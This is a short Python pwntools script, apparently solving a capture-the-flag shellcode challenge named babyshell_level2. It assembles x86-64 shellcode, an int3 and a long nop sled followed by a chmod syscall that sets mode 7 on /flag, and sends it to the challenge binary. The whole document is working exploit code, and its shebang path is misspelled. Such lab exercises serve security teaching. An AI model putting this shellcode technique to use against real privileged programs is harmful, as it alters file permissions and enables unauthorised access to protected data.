#!/bin/pyton3

from pwn import *

context.arch = 'AMD64'
sc = asm("""
    int3
    .rept 0x800
       nop
    .endr
    lea rdi, [rip + _flag_addr]
    mov rsi, 7
    mov rax, 90
    syscall

    _flag_addr:
    .ascii "/flag"
""")

p = process("/challenge/babyshell_level2")

p.send(sc)

#p.interactive()

